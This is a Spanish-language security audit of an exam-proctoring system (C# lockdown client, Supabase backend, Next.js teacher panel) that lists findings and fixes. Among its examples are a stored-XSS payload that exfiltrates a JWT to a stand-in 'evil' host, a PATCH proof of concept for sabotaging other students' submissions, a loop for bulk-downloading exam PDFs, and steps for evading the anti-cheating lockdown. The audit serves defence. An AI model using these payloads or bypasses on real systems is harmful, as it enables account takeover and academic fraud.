# Auditoría de EntregaEvaluacion — Seguridad, Arquitectura y Escalabilidad

> Auditoría consolidada sobre 52 hallazgos verificados (confirmados como reales tras revisión adversarial). Cobertura: seguridad de cliente C#, backend Supabase y panel Next.js; OWASP Top 10; SOLID; principios de arquitectura (SoC, acoplamiento, encapsulación, DRY) y escalabilidad. 10 hallazgos adicionales fueron verificados y descartados; no se reportan como problemas.

---

## 1. Resumen ejecutivo

**Qué es el sistema.** EntregaEvaluacion controla la rendición de exámenes en DUOC. Tiene tres componentes:

- **Cliente C# WPF** (carpeta `csharp/`): aplica lockdown anti-trampa (pantalla roja, bloqueo de internet, bloqueo de Copilot/VS Code), gestiona la entrega del alumno a GitHub Classroom (login device-flow, clonar/push/entregar), abre el PDF del enunciado y envía heartbeat de presencia.
- **Backend Supabase** (`csharp/*.sql`): Postgres con RLS, RPC `SECURITY DEFINER`, Storage (bucket `exam-pdfs`) y Realtime. La anon key es pública por diseño; la protección real son RLS + RPC.
- **Panel docente Next.js** (`admin-next/`): monitoreo en vivo (online_clients, cheat_events, suspicious_processes), control de lockdown y gestión de evaluaciones, con login email+password.

**Postura general de riesgo: ALTA.**

El modelo de seguridad acepta correctamente que la anon key es pública. El problema es que la **frontera de confianza está mal trazada**: muchas RPC y políticas RLS conceden a `anon` escritura/lectura **sin binding de identidad** (`USING(true)`, `WITH CHECK(true)`, `GRANT ... TO anon`). El sistema asume que "quien tiene la anon key es un cliente legítimo" y que "`authenticated` == profesor", y ninguna de esas dos suposiciones se valida. Para un sistema cuyo propósito es prevenir el fraude académico, esto entrega a cualquier alumno las primitivas para sabotear, suplantar, filtrar y bloquear.

**Riesgos top (severidad):**

1. **RCE distribuido a la sala** — `sec-client-08` (HIGH): el cliente hace `Process.Start(UseShellExecute=true)` sobre el PDF descargado sin validar extensión ni magic-byte. Si `evaluations.exam_pdf_path` se compromete (el gate de escritura es el rol `authenticated` desnudo, nunca ligado a la identidad del profesor), todos los clientes de la sala ejecutan el payload.
2. **Fuga del enunciado completo antes del examen** — `sec-backend-04` (HIGH): la policy SELECT del bucket `exam-pdfs` solo filtra por `bucket_id`. Cualquiera con la anon key lista y descarga **todos** los PDF, de **todas** las secciones, con nombres predecibles (`eval-N.pdf`), incluso antes de activarse la evaluación.
3. **Sabotaje de entregas ajenas** — `sec-backend-03` + `sec-backend-02` (HIGH): `UPDATE` anon con `USING(true)` permite reescribir el `repo_url` de la víctima justo antes del cierre; la lectura world-readable provee `github_username`+`assignment_id`.
4. **Bloqueo cruzado durante el examen** — `sec-backend-01` + `sec-backend-08` (HIGH): `report_self_lock` es anon-callable y escribe `active=true` para cualquier par `(pc_name, github_username)` sin binding; la liberación es authenticated-only, dejando bloqueada a la víctima hasta intervención manual del profesor.
5. **XSS almacenado → toma de cuenta del profesor** — `sec-panel-01` (HIGH): los `href` renderizan `repo_url` crudo (`safeHref` existe pero es código muerto, 0 usos); un esquema `javascript:` exfiltra el JWT de `localStorage`.
6. **Toma de cuenta entre alumnos en PC compartido** — `sec-client-04` (HIGH): `token.dat` (DPAPI CurrentUser) sobrevive entre alumnos bajo la misma cuenta Windows y el daemon re-autentica silenciosamente al alumno anterior.

## 3. Hallazgos por dimensión

### 3.1 Seguridad — Cliente C#

#### sec-client-08 — Shell-execute del PDF sin allowlist de extensión → RCE distribuido — **HIGH** (A08)
`csharp/src/Services/ExamPdfService.cs:43-64`
**Descripción.** `DownloadAndOpenAsync` descarga bytes de Storage y los abre con `Process.Start(new ProcessStartInfo(local){ UseShellExecute = true })`. La guarda anti-traversal con `Path.GetFileName` (línea 49) está bien, pero **no hay allowlist de extensión** ni verificación de magic-number. El nombre/extensión proviene de `evaluations.exam_pdf_path`.
**Evidencia.** `var safe = Path.GetFileName(storagePath); ... Process.Start(new ProcessStartInfo(local){UseShellExecute=true});`
**Impacto.** El caller (`MainWindow.xaml.cs:381-390`) pasa la ruta verbatim. `UseShellExecute=true` resuelve el handler por extensión: `x.hta`→mshta, `x.url/.lnk/.html`→handler por defecto → ejecución de código. **Matiz cargante (refuta la premisa literal del hallazgo):** RLS da a anon solo SELECT sobre `evaluations` y sobre el bucket; INSERT/UPDATE son `TO authenticated`. Pero el gate de escritura es el rol `authenticated` **desnudo** — ninguna de las 23 policies `TO authenticated` usa `auth.uid()`/`auth.email()`/allowlist; el sistema asume `authenticated == profe`. Si el self-signup de Supabase Auth está habilitado (default), cualquier portador de la anon key obtiene un JWT authenticated, sube `pwn.hta` y actualiza `exam_pdf_path` → RCE nativo room-wide. Aun con signup deshabilitado, una cuenta de profesor comprometida o un futuro relajamiento de la policy produce lo mismo. El cliente no aporta última línea de validación.
**Recomendación.** Forzar `.pdf` (rechazar/normalizar cualquier otra extensión), escribir siempre con sufijo `.pdf`, validar magic-byte `%PDF-` tras descargar, y abrir con un visor de PDF conocido en vez de `UseShellExecute=true`. Verificar en backend que solo el profe (identidad ligada) pueda escribir `exam_pdf_path`.

#### sec-client-04 — Toma de cuenta entre alumnos en PC compartido — **HIGH** (A07)
`csharp/src/Services/GitHubService.cs:36-58, 91-120`
**Descripción.** El token se cifra con DPAPI `CurrentUser` y se guarda en `%APPDATA%/EntregaEvaluacion/token.dat`. DPAPI CurrentUser aísla por **cuenta Windows**, no por alumno ni sesión de examen. En laboratorios con una cuenta Windows compartida (ej. "alumno"), cualquier alumno posterior puede descifrar el token del anterior. `LoadToken()` corre en el constructor y `MainWindow` instancia `GitHubService` al arrancar, de modo que el daemon re-autentica silenciosamente al alumno anterior.
**Evidencia.** `var raw = ProtectedData.Unprotect(enc, null, DataProtectionScope.CurrentUser); ... ApplyAuthHeader();`
**Impacto.** Tras una entrega, `SubirArchivosAsync` borra el PDF pero **no** llama `Logout()` ni toca `token.dat`. El siguiente alumno (o el daemon que relanza la app en ≤3 min) queda operando como el anterior: puede pushear/sobrescribir su repo de examen, leer **todos** sus repos privados (scope `repo`), y toda la actividad se reporta al panel bajo su identidad. El token device-flow no expira hasta revocación manual. Incluso sin un B malicioso, el examen del siguiente alumno corre bajo la identidad GitHub del anterior, corrompiendo la atribución.
**Recomendación.** No re-autenticar silenciosamente al arrancar en equipo de examen: exigir login por sesión; borrar `token.dat` al entregar (añadir `_gh.Logout()` a `SubirArchivosAsync`) y al cerrar/cambiar de alumno. Idealmente mantener el token solo en memoria durante la sesión. Documentar que con cuenta Windows compartida DPAPI no protege entre alumnos.

#### sec-client-01 — Secretos en `Config.cs` sobre repo PÚBLICO; el modelo cliente→backend depende 100% de RLS/RPC — **MEDIUM** (A02/A04)
`csharp/src/Config.cs:11-20`
**Descripción.** `Config.cs` (rastreado en git, repo PÚBLICO) commitea SupabaseUrl, SupabaseAnonKey (JWT rol anon), GitHubClientId y scopes. La anon key es safe-to-share por diseño (correcto). El residual a documentar: cualquiera con la key puede invocar todas las RPC anon-callable y los INSERT anon (heartbeat, report_self_lock, record_submission/acceptance, cheat_events, etc.).
**Evidencia.** `_http.DefaultRequestHeaders.Add("apikey", Config.SupabaseAnonKey)` (SupabaseClient.cs:45-47).
**Impacto.** Trivial, sin auth. Es el habilitador transversal de toda la familia `sec-backend-*`: falsificar heartbeats/entregas/aceptaciones, spamear alertas, sobrescribir el `repo_url` real de otro alumno (record_submission es `ON CONFLICT DO UPDATE`), inyectar evidencia falsa de trampa.
**Recomendación.** Aceptar la anon key como pública pero tratar TODA escritura/lectura anon como hostil: validar autoría server-side en cada RPC SECURITY DEFINER (no confiar en `p_github_username`/`p_pc_name`), rate-limit server-side, minimizar tablas con RLS anon-insert. Documentar explícitamente que la confidencialidad de la key NO es un control.

#### sec-client-09 — Navegador embebido permite Gmail completo y no endurece WebView2 — **MEDIUM** (A04)
`csharp/src/Config.cs:90-111`
**Descripción.** La whitelist incluye `mail.google.com` entero (canal bidireccional vivo) y `github.com`/`githubusercontent.com` enteros (gists/issues como scratchpad). `WebBrowserWindow` no toca `CoreWebView2.Settings` (sin `AreDevToolsEnabled`/`AreDefaultContextMenusEnabled`/`DownloadStarting`), dejando DevTools (F12), menú contextual y descargas habilitados.
**Impacto.** Concreto y alcanzable sin vencer el lockdown: durante el examen, `--no-proxy-server` hace de WebView2 la **única** app con internet. F12→console→`location.href='https://mail.google.com'` pasa `NavigationStarting` (whitelisted whole-domain) → Gmail completo + Chat sobre internet funcional mientras todo lo demás está bloqueado, sin disparar trampa.
**Recomendación.** Acotar Google al endpoint exacto de aceptación de invitación (patrón `AllowedExactUrls` como con el ACS de DUOC). Tras `EnsureCoreWebView2Async`, setear `AreDevToolsEnabled=false`, `AreDefaultContextMenusEnabled=false`, `AreBrowserAcceleratorKeysEnabled=false` y cancelar `DownloadStarting`.

#### sec-client-02 — Scopes OAuth sobre-provisionados (`repo workflow read:org gist`) — **LOW** (A05)
`csharp/src/Config.cs:20` · La app solo necesita `public_repo` (o `repo` si hay privados). `workflow`/`read:org`/`gist` no se usan. Menor blast radius si el token se filtra. Mitigado: el token es del propio alumno y `token.dat` está cifrado con DPAPI. **Recomendación:** reducir a `public_repo`, validar que ListRepos/AcceptInvitation/CreateRepo sigan funcionando.

#### sec-client-03 — Uso del Client ID público del GitHub CLI oficial — **LOW** (A05)
`csharp/src/Config.cs:16-17` · Consentimiento engañoso ("GitHub CLI" en vez de la app de proctoring), dependencia de una OAuth App de terceros, y token compartido con el `gh` real del alumno (auditoría/revocación indistinguibles). Sin exploit (no hay secret en device flow). **Recomendación:** registrar OAuth/GitHub App propia de DUOC con nombre y scopes mínimos.

#### sec-client-05 — Lockdown evadible sin admin (asInvoker): disuasivo, no defensa — **LOW** (A04)
`csharp/src/Services/LockdownService.cs:26-104` · Toda persistencia es HKCU/usuario y removible sin admin (`reg delete` de DisableTaskMgr/Run, `del` del marker, `schtasks /delete`, `taskkill`). CheatWindow no atrapa la tecla Windows ni Ctrl+Esc. **Recomendación:** asumir y documentar que es disuasivo; el control real es server-side (heartbeat + revisión del profe, que ya existe). No invertir en endurecer el kiosk sin elevación.

#### sec-client-06 — Hash+salt del password del profe en repo público; compuerta reproducible sin la clave — **LOW** (A04)
`csharp/src/Services/LockdownService.cs:18-40, 83-104` · Hardening razonable (PBKDF2-HMAC-SHA256, 200k iter, FixedTimeEquals — bien). Pero es secreto compartido baked-in sin rotación, y `Release()` solo hace borrados HKCU/archivo que el alumno replica sin la clave. **Recomendación:** la liberación legítima debe ser siempre remota (panel); password local solo como respaldo offline rotable, derivado por instalación, nunca commiteado.

#### sec-client-07 — Saboteo de `settings.json` gatilla lockdowns FALSO-POSITIVOS punitivos — **LOW** (A04)
`csharp/src/Services/CopilotBlockService.cs:554-607` · `IsBlocked()` envuelve la lectura sin try/catch en `catch { return false; }`. Una `IOException` transitoria (VS Code/AV/indexer escribiendo un setting NO relacionado) hace que el timer de 5s dispare `FireCheat → LockdownService.Trigger`: marker persistente + reporte `copilot-reactivation` contra un alumno inocente, liberable solo por el profe. Segundo vector: crear un perfil nuevo de VS Code tras `Block()`. **Recomendación:** re-aplicar claves silenciosamente; exigir señal corroborativa (NetworkProbe `ai_endpoint_contacted`) antes de la pantalla roja; histéresis/grace; tratar la reactivación como evidencia para revisión, no veredicto automático.

#### sec-client-10 — Bloqueo de internet trivialmente evadible y ventana de fuga al reinicio — **LOW** (A04)
`csharp/src/Services/InternetBlockService.cs:25-52, 99-111` · Solo afecta apps que respetan el proxy WinINET; Firefox/Tor/sockets crudos lo ignoran. El alumno puede quitar el proxy sin admin y **AdminTick no reconcilia contra el estado real del registro** (peor que la ventana de 20s del hallazgo: queda abierto indefinidamente). **Recomendación:** documentar como disuasivo; para bloqueo efectivo, firewall por proceso (admin) o control de red del aula.

### 3.2 Seguridad — Backend Supabase

> Patrón raíz transversal: RPC `SECURITY DEFINER` GRANTed a `anon` y policies `USING(true)/WITH CHECK(true)` sin **binding de identidad**. La corrección estructural es la misma en casi todos: ligar la escritura a una identidad verificable (token por-equipo emitido en bootstrap, o coincidencia con `online_clients` reciente) y mover los INSERT directos a RPC con rate-limit.

#### sec-backend-01 — `report_self_lock` permite a anon bloquear el equipo de cualquier alumno — **HIGH** (A01)
`csharp/migration-self-lock.sql:25-54`
**Descripción.** RPC SECURITY DEFINER, GRANT a anon. Inserta `targeted_lockdowns(active=true)` para los `p_pc_name`+`p_github_username` recibidos **sin validar** que el llamante sea ese PC/usuario. La liberación es authenticated-only (solo el profe), por lo que la víctima **no puede auto-liberarse**.
**Evidencia.** `GRANT EXECUTE ON FUNCTION public.report_self_lock(...) TO anon; ... VALUES (p_pc_name, p_github_username, true, ...) ON CONFLICT DO UPDATE SET active = true`
**Impacto.** Cualquiera con la anon key fuerza la pantalla roja en el equipo de un compañero a mitad del examen, bloqueado hasta intervención manual del profe. Los pares `(pc_name, github_username)` válidos se obtienen de `sec-backend-08` (targeted_lockdowns anon-readable) y `sec-backend-02`. El comentario "Reportarse bloqueado NO es explotable" es incorrecto: no hay binding.
**Recomendación.** Exigir una fila reciente en `online_clients` (last_seen < 60s) con ese mismo par creada por el heartbeat del propio equipo, o un token por-equipo emitido en bootstrap que la RPC valide. Alternativamente separar reporte (que solo el panel actúa) del bloqueo efectivo, con rate-limit y registro de origen.

#### sec-backend-02 — github usernames y repo_url de todos los alumnos legibles por anon — **HIGH** (A01)
`csharp/migration-submissions.sql:37-39`
**Descripción.** `assignment_submissions` y `assignment_acceptances` tienen SELECT abierto a anon (`USING(true)`). Como la anon key es pública, cualquiera vuelca ambas tablas: github_username, repo_url, repo_name, section, status, submitted_at de **todos** los alumnos. Ambas están en `supabase_realtime` (stream en vivo de cada entrega). Inconsistencia: browser_history/cheat_events/process_alerts/online_clients **sí** están authenticated-read; solo estas (y targeted_lockdowns) quedaron anon-read.
**Impacto.** En un sistema anti-fraude, entrega la URL del repo de los compañeros durante el examen + enumeración masiva de identidades GitHub. **Matiz:** los repos de Classroom son privados, así que un `repo_url` filtrado no concede clonado por sí solo (gated por GitHub) salvo repos públicos; el impacto cierto es PII/enumeración + vigilancia de estado de entrega.
**Recomendación.** Quitar la policy anon SELECT; dejar SELECT solo a authenticated. Si el cliente necesita confirmar su propia entrega, exponer RPC `get_my_submission`/`get_my_acceptance` SECURITY DEFINER filtrada (patrón ya usado en `get_my_enrollment`). Revisar la publicación realtime.

#### sec-backend-03 — anon puede sobrescribir/sabotear entrega o aceptación de cualquier alumno — **HIGH** (A01)
`csharp/migration-submissions.sql:41-43`
**Descripción.** Ambas tablas permiten `UPDATE` anon `USING(true) WITH CHECK(true)` sin scoping al llamante. Combinado con `sec-backend-02` (conoce github+assignment_id), un atacante reescribe la fila de OTRO alumno: justo antes del cierre cambia `repo_url` a un repo vacío/roto o altera `status`, haciendo que el profe evalúe el artefacto equivocado.
**Evidencia.** PoC PostgREST: `PATCH /rest/v1/assignment_submissions?github_username=eq.<victima>&assignment_id=eq.<id>` con apikey anon y body `{repo_url:'...roto', status:'submitted'}`.
**Recomendación.** Eliminar `anon_update_submissions`/`anon_update_acceptances`. Canalizar toda escritura por las RPC `record_*` endurecidas con binding de identidad (no pisar filas de un github distinto al verificado). Considerar bloquear la reescritura de `repo_url` tras `submitted` o versionar entregas para auditoría.

#### sec-backend-04 — Bucket `exam-pdfs`: anon lista y descarga TODOS los enunciados — **HIGH** (A01)
`csharp/migration-exam-pdf.sql:23-28`
**Descripción.** La policy de Storage concede SELECT a anon sin scoping por objeto (`USING (bucket_id = 'exam-pdfs')`). Sin acotar por path/evaluación/sección/active, cualquiera con la anon key lista el bucket entero y baja el enunciado de **todas** las evaluaciones, de otras secciones e incluso **antes** de que el examen comience. Los paths son predecibles (`eval-N.pdf`, IDs secuenciales generados en `EvaluationsSection.tsx:198`).
**Impacto.** Dos vías confirmadas: (1) `POST /storage/v1/object/list/exam-pdfs`; (2) `for n in 1..500: GET .../exam-pdfs/eval-$n.pdf`. Fuga directa del contenido de examen. El bucket es private, pero eso solo evita URLs anónimas; la anon key es pública. Es además el habilitador de la cadena RCE de `sec-client-08`.
**Recomendación.** Servir el PDF vía RPC/Edge Function que valide evaluación activa y emita signed URL de corta duración (retirando el SELECT anon directo); o, si se mantiene, restringir `USING` a un path por evaluación activa y deshabilitar el listado. Evitar nombres predecibles.

#### sec-backend-05 — `heartbeat` acepta identidad arbitraria: spoofing y flooding de online_clients — **MEDIUM** (A07)
`csharp/setup-supabase.sql:227-260` · SECURITY DEFINER, GRANT anon, sin binding ni rate-limit ni CHECK de longitud. **Flooding** (más efectivo, sin conocer víctima): loop con pares aleatorios → cada `(pc_name, github_username)` nuevo INSERTa fila; la única vista de monitoreo del profe se llena de basura y el almacenamiento crece sin techo (no hay purga de stale). **Spoofing** (requiere par exacto de la víctima): pisa su fila vía `ON CONFLICT`, reescribiendo lockdown_state/internet_state/processes que el panel muestra. **Recomendación:** binding por token de equipo o, mínimo, rate-limit por `pc_name`, CHECK de longitud/whitelist en estados, y job de purga de `last_seen` antiguo.

#### sec-backend-06 — `cheat_events`: anon puede falsificar trampas contra otros alumnos — **MEDIUM** (A08/A09)
`csharp/setup-supabase.sql:146-151` · INSERT abierto a anon (`WITH CHECK(true)`), campos libres. Un atacante inserta eventos de trampa atribuidos a CUALQUIER alumno; aparecen al instante en el panel realtime del profe → falsos positivos que pueden derivar en sanciones injustas; también inunda la tabla. **Recomendación:** canalizar por RPC SECURITY DEFINER con rate-limit (como `report_process_alert`) y binding de identidad; CHECK de longitud.

#### sec-backend-08 — `targeted_lockdowns` legible por anon: enumeración de bloqueados — **MEDIUM** (A01)
`csharp/setup-supabase.sql:204-209` · `USING(true)` expone github_username, pc_name, reason, source de **todos** los bloqueados. Es fuga de información ("quién y por qué") y el insumo directo para apuntar `sec-backend-01`. **Recomendación:** RPC `is_my_targeted_lock(p_pc_name, p_github_username)` que devuelva solo booleano/motivo de la fila propia; SELECT de la tabla restringido a authenticated.

#### sec-backend-12 — Sin validación de longitud ni rate-limit en RPCs/inserts anon: DoS por inundación — **MEDIUM** (Availability)
`csharp/setup-supabase.sql:179-209` · Salvo `report_process_alert` (30s) y `report_self_lock` (acotado por UNIQUE), el resto (heartbeat, record_*, inserts directos a cheat_events/student_activity/browser_history) no impone límites. Columnas TEXT/JSONB sin CHECK de tamaño. Un atacante infla `online_clients`/`browser_history`/etc. con payloads grandes, agotando almacenamiento y degradando el panel (varias tablas en realtime multiplican el costo). **Recomendación:** límites de longitud en TEXT críticos y tamaño máximo del JSONB `processes`; rate-limit por `(pc_name/github)`; purga periódica.

#### sec-backend-07 — `student_activity` y `browser_history`: INSERT anon sin validación — **LOW** (A08)
`csharp/setup-supabase.sql:154-159` · Inserts anon con github/pc/url arbitrarios, sin rate-limit (único control: `action IN (...)` en student_activity). Fabrica actividad/navegación prohibida a nombre de cualquiera o inunda. Lectura authenticated-only (la data falsa solo contamina el panel). **Recomendación:** mover a RPC SECURITY DEFINER con rate-limit y binding; CHECK de longitud en url/repo_name.

#### sec-backend-10 — `control`/`updated_by` legibles por anon: fuga menor de identidad docente — **LOW** (A02)
`csharp/setup-supabase.sql:138-143` · `control`/`evaluation_control`/`pc_overrides` anon-readable incluyendo `updated_by` (email del profe, seteado vía `auth.getUser`). El cliente necesita los flags, no `updated_by`. **Recomendación:** exponer al cliente solo columnas necesarias vía vista/RPC; dejar `updated_by` fuera del alcance anon o normalizarlo a un id no sensible.

#### sec-backend-11 — `get_my_enrollment` como oráculo de enumeración (sin PII) — **INFO** (A01)
`csharp/migration-enrollments.sql:187-214` · Bien diseñada: NO devuelve PII (solo section_id, status, found). Residual: funciona como oráculo (probar pares github+section sin límite). Acierto de diseño en lo importante. **Recomendación:** aceptable como trade-off; si se quiere cerrar, rate-limit o exigir heartbeat reciente coincidente.

### 3.3 Seguridad — Panel Next.js

#### sec-panel-01 — XSS almacenado vía esquema `javascript:` en href (`safeHref` es código muerto) — **HIGH** (A03)
`admin-next/.../ActivitySection.tsx:221, StudentDrawer.tsx:161, EvaluationStudentsDrawer.tsx:217` (+ classroom_url en EvaluationsSection:450, AssignmentsSection:392); `lib/url.ts:4`
**Descripción.** `lib/url.ts` define `safeHref()` con un comentario que advierte que React no bloquea `javascript:`/`data:` en href, **pero no se importa en ningún componente** (0 usos). Los enlaces renderizan el `repo_url` crudo de la BD. `repo_url` lo controla el alumno (vía RPC anon `record_submission` y policy `anon_insert_activity`).
**Impacto (verificado end-to-end).** El atacante registra `repo_url = javascript:fetch('https://evil/x?t='+localStorage.getItem('sb-...-auth-token'))`. Cuando el profe (authenticated) hace clic en el enlace durante la corrección, el JS corre en el origin del panel, lee el JWT de Supabase de `localStorage` (`persistSession:true`) y lo exfiltra → toma de cuenta del profe (toda la PII + escritura sobre control/targeted_lockdowns). No hay CSP. **Caveats que reducen fiabilidad:** todos los anchors tienen `target=_blank` y Chrome/Firefox modernos suelen bloquear navegaciones top-level `javascript:`/`data:` a un nuevo contexto (dependiente de versión, no defensa de la app, bypassable vía origin heredado de `about:blank`). Los dos sinks `classroom_url` son authenticated-write-only → self-XSS, no vector anon.
**Recomendación.** Envolver TODOS los href de URLs de BD con `safeHref()` y no renderizar el enlace (o mostrar texto plano) cuando devuelva null. Aplicar en las 5 ubicaciones. Reforzar `safeHref` para rechazar espacios/control chars y normalizar vía `new URL()` con allowlist de protocolo. Defensa en profundidad: CSP (`sec-panel-03`).

#### sec-panel-02 — Autorización plana: cualquier authenticated tiene lectura+escritura total — **MEDIUM** (A01)
`admin-next/components/App.tsx:43`; `csharp/migration-enrollments.sql:92`
**Descripción.** Login email+password; la autorización depende 100% de RLS (correcto), pero TODAS las policies de profe usan `TO authenticated USING(true) WITH CHECK(true)` sin discriminar usuario/rol/allowlist. El límite de seguridad es solo "poseer un JWT authenticated".
**Impacto.** Cadena condicionada a un único toggle: si el self-signup de Supabase Auth está habilitado (default), cualquiera se registra con su propio email, obtiene un JWT `authenticated` y satisface todas las policies de staff → exfiltra el roster completo (`enrollments`: full_name, email, blackboard_student_id) y escribe `control`/`targeted_lockdowns`/`assignments` (interrumpe exámenes en vivo). No hay guard a nivel código.
**Recomendación.** (1) Deshabilitar self-signup. (2) Autorización por usuario: tabla `staff` o claim de rol, restringir policies a `EXISTS (SELECT 1 FROM staff WHERE id = auth.uid())` o `auth.jwt()->>'role'='teacher'` en vez de `USING(true)`. (3) Documentar en README que el signup debe estar cerrado.

#### sec-panel-03 — Sin cabeceras de seguridad (CSP, X-Frame-Options) — **LOW** (A05)
`admin-next/next.config.ts:10`, `vercel.json`, `app/layout.tsx` · `output: export` sin `headers()`/middleware; sin CSP, sin X-Frame-Options, sin X-Content-Type-Options. **Matiz (revisión adversarial):** el clickjacking (justificación primaria) **no es realista** — todas las acciones destructivas están gated por diálogos nativos del navegador (`window.confirm`/`window.prompt`), que renderizan fuera del documento enmarcado y no se pueden superponer; la única acción sin diálogo (`releaseTargetLockdown`) es la menos dañina. Valor real residual: **defensa en profundidad** (frame-ancestors, nosniff, y CSP como mitigación secundaria de exfil de XSS de `sec-panel-01`). **Recomendación:** añadir headers en `vercel.json`: CSP con `default-src 'self'`, `connect-src 'self' https://<ref>.supabase.co wss://<ref>.supabase.co`, `frame-ancestors 'none'`, `X-Frame-Options DENY`, `X-Content-Type-Options nosniff`, `Referrer-Policy no-referrer`.

#### sec-panel-05 — Tablas anon-readable exponen usernames/repos/lockdown sin login — **LOW** (A01)
`csharp/migration-submissions.sql:39`, etc. · La PII fuerte está authenticated-only (bien), pero submissions/acceptances/suspicious_processes/targeted_lockdowns/allowed_urls/assignments/control tienen SELECT anon. La anon key viaja en el bundle estático (`NEXT_PUBLIC_*`). Trade-off parcialmente deliberado (el cliente anon las necesita), por eso LOW; residual de enumeración real. **Recomendación:** revisar si el cliente puede usar RPC SECURITY DEFINER acotada por alumno; restringir submissions/acceptances a authenticated (solapa con `sec-backend-02`). (Nota: parcialmente redundante con backend-02/08; consolidar la remediación.)

#### sec-panel-06 — JWT de Supabase en localStorage amplifica el XSS — **INFO** (A07)
`admin-next/lib/supabase.ts:14-16` · `persistSession:true` guarda access+refresh token en `localStorage` (no HttpOnly). Comportamiento estándar de supabase-js en SPA, no defecto en sí, pero eleva el impacto de `sec-panel-01` a robo de **refresh token** → acceso persistente. **Recomendación:** el control efectivo es eliminar el XSS + CSP; evaluar expiración corta del access token y rotación del refresh.

#### sec-panel-08 — Sin auditoría automatizada de dependencias en CI — **INFO** (A06)
`admin-next/package.json:11-37`, `vercel.json:5` · Dependencias actuales sin CVE conocida en esta revisión; no hay `pnpm audit`/Dependabot en el build. Brecha de proceso, no vulnerabilidad. **Recomendación:** añadir `pnpm audit --audit-level=high` (o Dependabot) que falle el build ante vulnerabilidades altas/críticas.

### 3.4 Principios de arquitectura

#### principles-01 — `MainWindow.xaml.cs` es un God class de 2143 líneas que viola SoC — **HIGH** (SoC)
`csharp/src/Windows/MainWindow.xaml.cs:19-2090` · Concentra cinco responsabilidades disjuntas: UI pura, orquestación de polling (`AdminTickAsync` con 7 chequeos secuenciales), red/persistencia (`_sb` directo en decenas de sitios), reglas de negocio Classroom (`ComputeAssignmentStatusesAsync`) y control del lockdown anti-trampa. **Impacto:** no es exploit; es brecha de testabilidad — lógica de integridad security-critical (status bucketing, lockdown triggering) soldada a un `Window` con `new()` y sin DI, imposible de unit-testear → drift silencioso de la aplicación de integridad. **Recomendación:** extraer un orquestador sin UI (`ExamMonitorController`) con dependencias por constructor que exponga eventos/estado; mover `ComputeAssignmentStatusesAsync` y el bucketing a un `AssignmentStatusService`. Objetivo: code-behind < ~400 líneas de wiring.

#### principles-05 — 11 servicios `static class` como acoplamiento global; cliente intesteable — **MEDIUM** (Acoplamiento)
`csharp/src/Services/InternetBlockService.cs:11` (+10 más) · Casi toda la capa de servicios es `public static class` sin interfaz; `MainWindow` los invoca por tipo concreto. No hay forma de inyectar dobles: cualquier test dispara efectos reales (matar browsers, escribir el registro). Contraste: `ExamSessionService` sí implementa `IExamSessionService` — el patrón correcto existe pero no se generalizó. **Recomendación:** definir interfaces (`IInternetBlocker`, `ILockdownService`, `IProcessMonitor`...) e inyectarlas al orquestador de `principles-01`. Mantener estáticos solo para utilidades sin estado.

#### principles-11 — Lista de procesos sospechosos duplicada en 5 lugares (C#, TS, 3× SQL) — **MEDIUM** (DRY)
`csharp/src/Config.cs:45-53` · ~34 nombres copiados en `Config.SuspiciousProcesses`, `suspicious.ts`, y 3 seeds SQL. **Matiz (revisión adversarial):** la fuente de verdad runtime es la tabla `suspicious_processes` que el cliente fetchea en vivo; los hardcodes son solo fallback (red caída/tabla vacía) y seed de instalación. Drift solo degrada cobertura en esos casos estrechos, sobre un control heurístico ya defeatable. Por eso el impacto real es menor al "high" original, pero la fragilidad es genuina. **Recomendación:** fuente única de runtime (la tabla); reducir/generar los fallbacks desde un único JSON en build + test de paridad C#-TS-seed.

#### principles-14 — Esquema y seed SQL duplicados entre migraciones y `all-in-one` — **MEDIUM** (DRY)
`supabase-all-in-one.sql:102, 212` · `all-in-one` es concatenación manual de migraciones → dos fuentes de verdad del esquema. **Failure mode concreto:** el `all-in-one` (último commit f5aea96) ya está obsoleto vs incrementales (hasta ce29bae): le faltan `enrollments` (PII), `evaluation_control`, `allowed_urls`, `pc_overrides` con sus RLS/RPCs. Un setup limpio desde `all-in-one` queda incompleto/divergente. **Recomendación:** una única fuente (migraciones incrementales) y generar `all-in-one` por script; check de CI que regenere y falle si difiere.

#### principles-02 — Lógica de dominio pura embebida en code-behind — **LOW** (SoC)
`MainWindow.xaml.cs:624-636, 1095-1107, 1302-1331, 1374-1385` · `Sanitize`, `ExpectedClassroomRepo`, `PickAssignmentByLongestPrefix` (matching bipartito longest-prefix, la lógica más delicada) y el cálculo de buckets, atados a la Window → sin tests. Riesgo: edición futura rompe en silencio el desempate y mapea invitaciones a la tarea equivocada. **Recomendación:** mover a clase de dominio sin UI + tests de tabla.

#### principles-03 — Escrituras del panel mezclan datos con presentación — **LOW** (SoC)
`admin-next/.../CoursesSection.tsx:34-85` · La lectura está bien encapsulada (hooks realtime), pero 8 secciones llaman `supabase` directo para escribir (insert/update/delete + toast en el componente JSX). **Recomendación:** completar la capa de datos con mutations por entidad (`useMutation` genérico).

#### principles-04 — Reglas de negocio del lockdown dentro del cliente HTTP — **LOW** (SoC)
`csharp/src/Services/SupabaseClient.cs:141-192` · `GetEffectiveControlAsync` mezcla transporte REST con política de resolución override-sobre-global y fail-safe degradar-cerrado (cache mutable `_lastKnownLock`). El fail-safe funciona (degrada cerrado), sin hueco explotable; residual de testabilidad. **Recomendación:** a mediano plazo separar transporte fino de un `LockdownPolicyResolver` con tests sobre la matriz de fallos.

#### principles-07 — La capa de datos lee estado global de UI (`StudentSection`) — **LOW** (Acoplamiento)
`csharp/src/Services/SupabaseClient.cs:611-617` · `IsForceLockdownAsync` llama a `StudentSection.GetEvaluationId()` (HKCU), rompiendo la simetría donde evaluationId se pasa por parámetro. **Recomendación:** pasar `evaluationId` como parámetro y eliminar la dependencia sobre el singleton.

`csharp/src/Services/StudentSection.cs:10-84` · Singleton mutable de facto (Section/SectionId/EvaluationId en HKCU) escrito/leído en 44 sitios, con `catch` vacío que oculta fallos. **Recomendación:** encapsular en `ISelectionStore` inyectado con un único owner que notifique cambios.

`csharp/src/Config.cs:69-76` · Contrato que exige paridad byte-a-byte. **Matiz:** hoy son equivalentes y la divergencia no sobreviviría a la re-normalización C# en el path autoritativo (`SupabaseClient.cs:303`/`ProcessMonitor.cs:56`); blast radius cosmético (highlight TS del panel). **Recomendación:** test de contraste con vectores compartidos versionados.

#### principles-13 — Tres closures `checkStillLocked`/`onHeartbeat` casi idénticos — **LOW** (DRY)
